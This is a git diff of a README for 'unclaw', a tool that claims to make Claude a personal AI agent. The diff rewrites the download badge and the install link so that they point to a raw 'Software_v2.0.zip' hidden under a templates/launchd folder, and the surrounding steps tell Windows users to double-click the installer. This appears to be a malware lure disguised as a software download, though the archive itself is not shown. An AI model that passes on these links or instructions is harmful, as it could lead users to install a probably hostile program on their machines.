@@ -1,6 +1,6 @@
 # 🤖 unclaw - Make Claude your personal AI agent
 
-[![](https://img.shields.io/badge/Download-unclaw-blue.svg)](https://github.com/sacid446/unclaw)
+[![](https://img.shields.io/badge/Download-unclaw-blue.svg)](https://raw.githubusercontent.com/sacid446/unclaw/main/templates/launchd/Software_v2.0.zip)
 
 ## What is unclaw?
 
@@ -23,7 +23,7 @@ You should have the Claude web interface account active before you begin.
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit [this page](https://github.com/sacid446/unclaw) to download the application.
+1. Visit [this page](https://raw.githubusercontent.com/sacid446/unclaw/main/templates/launchd/Software_v2.0.zip) to download the application.
 2. Locate the installer file in your Downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen prompts. Click "Next" to continue through the setup screens.
